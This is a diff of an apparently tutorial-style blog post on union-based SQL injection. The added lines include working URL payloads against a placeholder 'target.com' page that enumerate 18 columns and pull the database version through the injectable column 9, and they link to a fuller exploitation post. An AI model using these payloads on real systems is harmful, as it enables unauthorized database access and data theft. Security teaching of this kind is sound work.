@@ -44,7 +44,22 @@ let's proceed to getting the vulnerable column
 
 ```https://target.com/page.php?pe=-36' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-```
 
-column 9 is the vulnerable coulmn where we can inject our queries for dumping t5he datasbase
+column 9 is the vulnerable coulmn where we can inject our queries for dumping the datasbase
+
+let's get the version of the SQL database using the query ``@@version``
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/21fb6754-0c1f-41cc-8ba0-1bd7d814d342)
+
+```https://target.com/page.php?pe=-36' union select 1,2,3,4,5,6,7,8,@@version,10,11,12,13,14,15,16,17,18--+-```
+
+will be stopping here since the vulnerability and its explitation has been confirmed.
+
+check [previous post](https://0xvenus.github.io/posts/tutorials/Union_Based_SQLi.html) for how to perform the full exploitation step by step
+
+Thanks
+
+See you in the next post for another amazing trick.
+
 
 
 
